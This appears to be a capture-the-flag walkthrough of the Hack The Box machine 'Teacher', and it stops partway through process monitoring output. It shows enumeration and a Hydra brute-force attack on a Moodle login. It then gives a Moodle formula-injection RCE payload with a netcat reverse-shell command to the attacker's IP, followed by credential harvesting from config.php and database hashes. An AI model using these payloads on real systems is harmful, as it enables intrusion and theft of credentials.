# Teacher

```
kali@kali:~/htb/Teacher$ sudo nmap -p- -sC -sV 10.129.29.184
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 06:06 EST
Nmap scan report for 10.129.29.184
Host is up (0.026s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.49 seconds
```

I go to the webpage, but can't find anything interesting except for some javascript files.

Wfuzz returns a phpmyadmin directory, but I do not have access.

I decide to enumerate further with nmap:

```
kali@kali:~/htb/Teacher$ sudo nmap -p80 -script vuln,http-enum 10.129.29.184
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 07:06 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.29.184
Host is up (0.025s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.29.184
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.29.184:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://10.129.29.184:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://10.129.29.184:80/gallery.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.129.29.184:80/gallery.html
|     Form id: 
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_  /manual/: Potentially interesting folder
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.0.1
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.129.29.184:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.29.184:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|_    http://10.129.29.184:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 56.67 seconds
kali@kali:~/htb/Teacher$ 
```

And searchsploit the apache version:

```
kali@kali:~/htb/Teacher$ searchsploit apache 2.4.25
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                         | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                     | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                          | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                       | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution  | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                          | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Teacher$ 
```

And fuzzing:

```
kali@kali:~/htb/Teacher$ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.29.184/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.29.184/FUZZ
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                       
===================================================================

000000003:   200        249 L    747 W    8028 Ch     "# Copyright 2007 James Fisher"                                               
000000001:   200        249 L    747 W    8028 Ch     "# directory-list-2.3-medium.txt"                                             
000000007:   200        249 L    747 W    8028 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
000000013:   200        249 L    747 W    8028 Ch     "#"                                                                           
000000009:   200        249 L    747 W    8028 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
000000010:   200        249 L    747 W    8028 Ch     "#"                                                                           
000000011:   200        249 L    747 W    8028 Ch     "# Priority ordered case sensative list, where entries were found"            
000000012:   200        249 L    747 W    8028 Ch     "# on atleast 2 different hosts"                                              
000000006:   200        249 L    747 W    8028 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
000000008:   200        249 L    747 W    8028 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                  
000000005:   200        249 L    747 W    8028 Ch     "# This work is licensed under the Creative Commons"                          
000000014:   200        249 L    747 W    8028 Ch     "http://10.129.29.184/"                                                       
000000016:   200        85 L     709 W    15198 Ch    "images"                                                                      
000000002:   200        249 L    747 W    8028 Ch     "#"                                                                           
000000004:   200        249 L    747 W    8028 Ch     "#"                                                                           
000000550:   200        16 L     59 W     932 Ch      "css"                                                                         
000000730:   200        12 L     26 W     626 Ch      "manual"                                                                      
000000953:   200        18 L     81 W     1351 Ch     "js"                                                                          
000001073:   403        11 L     32 W     299 Ch      "javascript"                                                                  
000002771:   200        27 L     175 W    3347 Ch     "fonts"                                                                       
000010825:   403        11 L     32 W     298 Ch      "phpmyadmin"                                                                  

Total time: 0
Processed Requests: 14672
Filtered Requests: 14651
Requests/sec.: 0
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:48: UserWarning:Fatal exception: Pycurl error 6: Could not resolve host: teacher.htb
```


I try running sqlmap on the js injection target, but it does not seem to be injectable.


And none of the exploits seem usable atm.

The only leads I currently have are the images on the site, and the js.

So I download all the images locally:

```
kali@kali:~/htb/Teacher$ wget -r http://10.129.29.184/images
kali@kali:~/htb/Teacher/10.129.29.184/images$ ls
 1_1.png    5_12.png   5_9.png                       bg_arrow_select@2x.png   bg_white.png             ico_place.png        'index.html?C=N;O=A'
 1.png      5_13.png   5.png                         bg_arrow_select.png      ico_close@2x.png         ico_social@2x.png    'index.html?C=N;O=D'
 2.png      5_14.png   bg_arrow@2x.png               bg_blue.png              ico_close.png            ico_social.png       'index.html?C=S;O=A'
 3.png      5_15.png   bg_arrow_blue@2x.png          bg_menu_trigger@2x.png   ico_contacts@2x.png      ico_time_2@2x.png    'index.html?C=S;O=D'
 4_2.png    5_16.png   bg_arrow_blue_dark@2x.png     bg_menu_trigger.png      ico_contacts.png         ico_time_2.png        logo@2x.png
 4_3.png    5_2.png    bg_arrow_blue_dark.png        bg_slider_nav_2@2x.png   ico_form@2x.png          ico_time@2x.png       logo.png
 4_4.png    5_3.png    bg_arrow_blue.png             bg_slider_nav_2.png      ico_form.png             ico_time.png          pic_slide.jpg
 4_5.png    5_4.png    bg_arrow_information@2x.png   bg_slider_nav@2x.png     ico_information@2x.png   index.html
 4_6.png    5_5.png    bg_arrow_information.png      bg_slider_nav.png        ico_information.png     'index.html?C=D;O=A'
 4.png      5_6.png    bg_arrow_nav@2x.png           bg_white@2x.png          ico_place_2@2x.png      'index.html?C=D;O=D'
 5_10.png   5_7.png    bg_arrow_nav.png              bg_white_arrow@2x.png    ico_place_2.png         'index.html?C=M;O=A'
 5_11.png   5_8.png    bg_arrow.png                  bg_white_arrow.png       ico_place@2x.png        'index.html?C=M;O=D'
kali@kali:~/htb/Teacher/10.129.29.184/images$ rm *index*
kali@kali:~/htb/Teacher/10.129.29.184/images$ ls
1_1.png  4.png     5_3.png          bg_arrow_blue@2x.png         bg_arrow_select@2x.png  bg_white@2x.png        ico_form.png            ico_time_2@2x.png
1.png    5_10.png  5_4.png          bg_arrow_blue_dark@2x.png    bg_arrow_select.png     bg_white_arrow@2x.png  ico_information@2x.png  ico_time_2.png
2.png    5_11.png  5_5.png          bg_arrow_blue_dark.png       bg_blue.png             bg_white_arrow.png     ico_information.png     ico_time@2x.png
3.png    5_12.png  5_6.png          bg_arrow_blue.png            bg_menu_trigger@2x.png  bg_white.png           ico_place_2@2x.png      ico_time.png
4_2.png  5_13.png  5_7.png          bg_arrow_information@2x.png  bg_menu_trigger.png     ico_close@2x.png       ico_place_2.png         logo@2x.png
4_3.png  5_14.png  5_8.png          bg_arrow_information.png     bg_slider_nav_2@2x.png  ico_close.png          ico_place@2x.png        logo.png
4_4.png  5_15.png  5_9.png          bg_arrow_nav@2x.png          bg_slider_nav_2.png     ico_contacts@2x.png    ico_place.png           pic_slide.jpg
4_5.png  5_16.png  5.png            bg_arrow_nav.png             bg_slider_nav@2x.png    ico_contacts.png       ico_social@2x.png
4_6.png  5_2.png   bg_arrow@2x.png  bg_arrow.png                 bg_slider_nav.png       ico_form@2x.png        ico_social.png
kali@kali:~/htb/Teacher/10.129.29.184/images$ 
```

I try to search for strings in the files:

```
kali@kali:~/htb/Teacher/10.129.29.184/images$ strings -f -n 5 * | grep "user"
kali@kali:~/htb/Teacher/10.129.29.184/images$ strings -f -n 5 * | grep "password"
5.png: I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
kali@kali:~/htb/Teacher/10.129.29.184/images$ 
```

so 5.png has text in it.

```
kali@kali:~/htb/Teacher/10.129.29.184/images$ cat 5.png 
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
kali@kali:~/htb/Teacher/10.129.29.184/images$ 
```

So Giovanni has the password: Th4C00lTheacha_

So I'm wondering what I'm missing, there's no login page. phpmyadmin is stuck behind a 403. The fonts folder contains nothing, so I go over my fuzzing again. And I notice the error message:

```
Processed Requests: 14672
Filtered Requests: 14651
Requests/sec.: 0
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:48: UserWarning:Fatal exception: Pycurl error 6: Could not resolve host: teacher.htb
```

Now, the amount of requests in the wordlist is 220560. And I ran 14672.

So I'm missing a lot. It could not resolve the host teacher.htb. So let's try adding it to the /etc/hosts file.

And after that I find this: `000014433:   200        272 L    1100 W     26871 Ch    "moodle"   `

Moodle is a teaching platform online. I used it for my degree actually.

I head over to teacher.htb/moodle. And we get a page. With a log in! We can see that the teacher's name is "Giovanni Chhatta" 

I try a couple of different log in creds, but nothign works. There is a search by username function, but it does not help.

I run a searchsploit on moodle:

```
kali@kali:~/htb/Teacher/10.129.29.184$ searchsploit moodle
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Mambo Component Mam-Moodle alpha - Remote File Inclusion                                                                  | php/webapps/2064.txt
Moodle - Remote Command Execution (Metasploit)                                                                            | linux/remote/29324.rb
Moodle 1.1/1.2 - Cross-Site Scripting                                                                                     | php/webapps/24071.txt
Moodle 1.5.2 - 'moodledata' Remote Session Disclosure                                                                     | php/webapps/3508.txt
Moodle 1.5/1.6 - '/mod/forum/discuss.php?navtail' Cross-Site Scripting                                                    | php/webapps/29284.txt
Moodle 1.6dev - SQL Injection / Command Execution                                                                         | php/webapps/1312.php
Moodle 1.7.1 - 'index.php' Cross-Site Scripting                                                                           | php/webapps/30261.txt
Moodle 1.8.3 - 'install.php' Cross-Site Scripting                                                                         | php/webapps/31020.txt
Moodle 1.8.4 - Remote Code Execution                                                                                      | php/webapps/6356.php
Moodle 1.9.3 - Remote Code Execution                                                                                      | php/webapps/7437.txt
Moodle 1.x - 'post.php' Cross-Site Scripting                                                                              | php/webapps/24356.txt
Moodle 2.0.1 - 'PHPCOVERAGE_HOME' Cross-Site Scripting                                                                    | php/webapps/35297.txt
Moodle 2.3.8/2.4.5 - Multiple Vulnerabilities                                                                             | php/webapps/28174.txt
Moodle 2.5.9/2.6.8/2.7.5/2.8.3 - Block Title Handler Cross-Site Scripting                                                 | php/webapps/36418.txt
Moodle 2.7 - Persistent Cross-Site Scripting                                                                              | php/webapps/34169.txt
Moodle 2.x/3.x - SQL Injection                                                                                            | php/webapps/41828.php
Moodle 3.4.1 - Remote Code Execution                                                                                      | php/webapps/46551.php
Moodle 3.6.3 - 'Install Plugin' Remote Command Execution (Metasploit)                                                     | php/remote/46775.rb
Moodle < 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure                                                                        | php/webapps/8297.txt
Moodle Blog 1.18.2.2/1.6.2 Module - SQL Injection                                                                         | php/webapps/28770.txt
Moodle Filepicker 3.5.2 - Server Side Request Forgery                                                                     | php/webapps/47177.txt
Moodle Help Script 1.x - Cross-Site Scripting                                                                             | php/webapps/24279.txt
Moodle Jmol Filter 6.1 - Directory Traversal / Cross-Site Scripting                                                       | php/webapps/46881.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Teacher/10.129.29.184$ 
```


I decide to write a username-wordlist-generator:

```
#!/usr/bin/python3

info=[]
with open("info.txt") as f:
    for line in f:
        line = line.strip()
        line = line.split(" ")
        info.append(line)


unames = []
for name in info:

    unames.append(name[0])
    unames.append(name[1])

    unames.append(name[0]+name[1])
    unames.append(name[1]+name[0])
    unames.append(name[0]+"."+name[1])
    unames.append(name[0]+"-"+name[1])
    unames.append(name[0]+"_"+name[1])

    unames.append(name[1]+"."+name[0])
    unames.append(name[1]+"-"+name[0])
    unames.append(name[1]+"_"+name[0])


    unames.append(name[1][0]+name[0])
    unames.append(name[1][0:3]+name[0])
    unames.append(name[0][0]+name[1])
    unames.append(name[0][0:3]+name[1])

    unames.append(name[0][0]+""+name[1])
    unames.append(name[0][0]+"."+name[1])
    unames.append(name[0][0]+"-"+name[1])
    unames.append(name[0][0]+"_"+name[1])
    
    unames.append(name[1][0]+""+name[0])
    unames.append(name[1][0]+"."+name[0])
    unames.append(name[1][0]+"-"+name[0])
    unames.append(name[1][0]+"_"+name[0])

    unames.append(name[0]+""+name[1][0])
    unames.append(name[0]+"."+name[1][0])
    unames.append(name[0]+"-"+name[1][0])
    unames.append(name[0]+"_"+name[1][0])
  
    unames.append(name[1]+""+name[0][0])  
    unames.append(name[1]+"."+name[0][0])
    unames.append(name[1]+"-"+name[0][0])
    unames.append(name[1]+"_"+name[0][0])

    unames.append(name[0][0:3]+""+name[1])
    unames.append(name[0][0:3]+"."+name[1])
    unames.append(name[0][0:3]+"-"+name[1])
    unames.append(name[0][0:3]+"_"+name[1])
 
    unames.append(name[1][0:3]+""+name[0])
    unames.append(name[1][0:3]+"."+name[0])
    unames.append(name[1][0:3]+"-"+name[0])
    unames.append(name[1][0:3]+"_"+name[0])
 
    unames.append(name[0]+""+name[1][0:3]) 
    unames.append(name[0]+"."+name[1][0:3])
    unames.append(name[0]+"-"+name[1][0:3])
    unames.append(name[0]+"_"+name[1][0:3])
 

    unames.append(name[1]+""+name[0][0:3]) 
    unames.append(name[1]+"."+name[0][0:3])
    unames.append(name[1]+"-"+name[0][0:3])
    unames.append(name[1]+"_"+name[0][0:3])
 
    unames.append(name[0][0:3]+""+name[1][0:3])
    unames.append(name[0][0:3]+"."+name[1][0:3])
    unames.append(name[0][0:3]+"-"+name[1][0:3])
    unames.append(name[0][0:3]+"_"+name[1][0:3])
 
    unames.append(name[1][0:3]+""+name[0][0:3])
    unames.append(name[1][0:3]+"."+name[0][0:3])
    unames.append(name[1][0:3]+"-"+name[0][0:3])
    unames.append(name[1][0:3]+"_"+name[0][0:3])

    unames.append(name[0][0]+""+name[1][0:3])
    unames.append(name[0][0]+"."+name[1][0:3])
    unames.append(name[0][0]+"-"+name[1][0:3])
    unames.append(name[0][0]+"_"+name[1][0:3])
 
    unames.append(name[1][0]+""+name[0][0:3])
    unames.append(name[1][0]+"."+name[0][0:3])
    unames.append(name[1][0]+"-"+name[0][0:3])
    unames.append(name[1][0]+"_"+name[0][0:3])

    unames.append(name[0][0:3]+""+name[1][0])
    unames.append(name[0][0:3]+"."+name[1][0])
    unames.append(name[0][0:3]+"-"+name[1][0])
    unames.append(name[0][0:3]+"_"+name[1][0])
 
    unames.append(name[1][0:3]+""+name[0][0])
    unames.append(name[1][0:3]+"."+name[0][0])
    unames.append(name[1][0:3]+"-"+name[0][0])
    unames.append(name[1][0:3]+"_"+name[0][0])



with open("usernames.txt", "w") as f:
    for uname in unames:
        f.write(uname+"\n")
```

And a small password wordlist generator that just adds the missing character:


```
#!/usr/bin/python3

info=[]
with open("pass_info.txt") as f:
    for line in f:
        line = line.strip()
        info.append(line)


passwds = []

for pwd in info:
    for i in range(33, 126):
        passwds.append(pwd+chr(i))


with open("pass.txt", "w") as f:
    for p in passwds:
        f.write(p+"\n")
```

So with these two wordlists we can start the dictionary attack:

```
kali@kali:~/htb/Teacher$ sudo hydra teacher.htb http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^:S=profile.php" -L usernames.txt -P pass.txt -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-07 09:54:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 6510 login tries (l:70/p:93), ~407 tries per task
[DATA] attacking http-post-form://teacher.htb:80/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^:S=profile.php
[80][http-post-form] host: teacher.htb   login: Giovanni   password: Th4C00lTheacha#
[STATUS] attack finished for teacher.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-07 09:54:46
kali@kali:~/htb/Teacher$ 
```

I got the login string "anchor=&username=^USER^&password=^PASS^" from the developer tools on the network tab. I sent a login request and checked the request tab under the index.php POST request.

I check the remote code execution moodle exploit, and this website: https://blog.ripstech.com/2018/moodle-remote-code-execution/ And see that we can get reverse shell here via a math quiz.

I adda new quiz. edit it, and add a question of the type "calculated". I fill in everything needed, and set Answer 1 formula to: "/*{a*/`$_GET[0]`;//{x}}"

I go forward a bit until I see the code on the page and add this on the end of the url: "&0=nc 10.10.14.70 1337 -e /bin/bash"

And on the listener:

```
kali@kali:~/htb/Teacher$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.29.184 60510
whoami
www-data
```

I elevate the shell as usual and start looking.

```
www-data@teacher:/var$ grep -rnw . -e 'pass =' 2>/dev/null
./www/html/moodle/auth/db/tests/db_test.php:304:        $user3->pass = md5('heslo');
./www/html/moodle/auth/db/tests/db_test.php:310:        $user3->pass = sha1('heslo');
./www/html/moodle/auth/db/tests/db_test.php:316:        $user3->pass = password_hash('heslo', PASSWORD_BCRYPT);
./www/html/moodle/lib/yuilib/3.17.2/get-nodejs/get-nodejs.js:26:        }, pass = function(cb) {
./www/html/moodle/lib/yuilib/3.17.2/get-nodejs/get-nodejs-debug.js:27:        }, pass = function(cb) {
./www/html/moodle/lib/yuilib/3.17.2/yui-nodejs/yui-nodejs-debug.js:4247:        }, pass = function(cb) {
./www/html/moodle/lib/yuilib/3.17.2/yui-nodejs/yui-nodejs.js:3999:        }, pass = function(cb) {
./www/html/moodle/lib/dml/pgsql_native_moodle_database.php:131:        $pass = addcslashes($this->dbpass, "'\\");
./www/html/moodle/lib/editor/tinymce/tiny_mce/3.5.11/tiny_mce_src.js:8072:                                                      pass = not ^ found;
./www/html/moodle/lib/webdavlib.php:102:    public function __construct($server = '', $user = '', $pass = '', $auth = false, $socket = '', $oauthtoken = '') {
./www/html/moodle/lib/webdavlib.php:108:            $this->pass = $pass;
./www/html/moodle/lib/xhprof/xhprof_html/jquery/jquery-1.2.6.js:1660:                   var pass = (" " + r[i].className + " ").indexOf( m ) >= 0;
./www/html/moodle/lib/weblib.php:285:    protected $pass = '';
./www/html/moodle/lib/weblib.php:332:            $this->pass = $url->pass;
./www/html/moodle/admin/cron.php:66:    $pass = optional_param('password', '', PARAM_RAW);
./www/html/moodle/repository/s3/S3.php:286:     public static function setProxy($host, $user = null, $pass = null, $type = CURLPROXY_SOCKS5)
www-data@teacher:/var$ 
```

I look for any open passwords and see that moodle has some databases open.

I check the moodle config file:

```
www-data@teacher:/var/www/html/moodle$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);

$CFG->wwwroot   = 'http://teacher.htb/moodle';
$CFG->dataroot  = '/var/www/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
www-data@teacher:/var/www/html/moodle$ 
```

And get a mariadb database.

I run the command `www-data@teacher:/var/www/html/moodle$ mysql -uroot -p` and use the password "Welkom1!" from above to log in.

I use commands like `show databases;`, `use database`, `show tables;`, `describe table;`, and finally:

```
MariaDB [moodle]> select username,password from mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)

MariaDB [moodle]> 
```

I use hash identifier to check out the password:

```
kali@kali:~/htb/Teacher$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 7a860966115182402ed06375cf0a22af

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

I try a couple of different sites, and https://www.md5decrypt.org/ gives me "expelled"

So let's try it:

```
www-data@teacher:/var/www/html/moodle$ su -l giovanni
Password: 
giovanni@teacher:~$ id
uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
giovanni@teacher:~$ 
```

I download pspy: https://github.com/DominicBreuker/pspy to the target machine with a python SimpleHTTPServer and wget. and run it.

```
giovanni@teacher:~$ chmod 777 pspy64 
giovanni@teacher:~$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/02/07 18:35:06 CMD: UID=0    PID=962    | /usr/sbin/apache2 -k start 
2021/02/07 18:35:06 CMD: UID=1000 PID=9023   | ./pspy64 
2021/02/07 18:35:06 CMD: UID=0    PID=9      | 
2021/02/07 18:35:06 CMD: UID=0    PID=8964   | 
2021/02/07 18:35:06 CMD: UID=0    PID=8839   | 
2021/02/07 18:35:06 CMD: UID=1000 PID=8783   | -su 
2021/02/07 18:35:06 CMD: UID=1000 PID=8781   | (sd-pam)   
2021/02/07 18:35:06 CMD: UID=1000 PID=8780   | /lib/systemd/systemd --user 
2021/02/07 18:35:06 CMD: UID=33   PID=8779   | su -l giovanni 
2021/02/07 18:35:06 CMD: UID=0    PID=8751   | 
2021/02/07 18:35:06 CMD: UID=0    PID=8636   | 
2021/02/07 18:35:06 CMD: UID=107  PID=835    | /usr/sbin/mysqld 
2021/02/07 18:35:06 CMD: UID=0    PID=8      | 
2021/02/07 18:35:06 CMD: UID=33   PID=7818   | mysql -uroot -p 
2021/02/07 18:35:06 CMD: UID=0    PID=77     | 
2021/02/07 18:35:06 CMD: UID=0    PID=76     | 
2021/02/07 18:35:06 CMD: UID=0    PID=7532   | 
2021/02/07 18:35:06 CMD: UID=0    PID=75     | 
